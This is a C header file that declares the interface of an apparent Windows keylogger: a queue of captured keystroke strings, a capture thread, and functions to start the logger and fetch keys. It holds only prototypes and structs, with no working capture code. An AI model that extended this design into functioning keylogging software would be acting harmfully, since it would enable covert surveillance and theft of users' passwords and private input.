#ifndef _keylogger_h
#define _keylogger_h

struct QNodeKeylog
{
	char data[20];
	struct QNodeKeylog* next;
};
struct QueueKeylog
{
		struct QNodeKeylog *front, *rear;
};

struct QNodeKeylog* newNodeKeylog(char* data);
struct QueueKeylog* createQueueKeylog();
int EnqueueKeylog(struct QueueKeylog* q, char* data);
struct QNodeKeylog* DequeueKeylog(struct QueueKeylog* q);
DWORD WINAPI threadKeylog(void* arg);
HANDLE startKeylogger(struct QueueKeylog* q);
void keylog(struct QueueKeylog* q);
int getKeylog(struct QueueKeylog* q,char* key);

#endif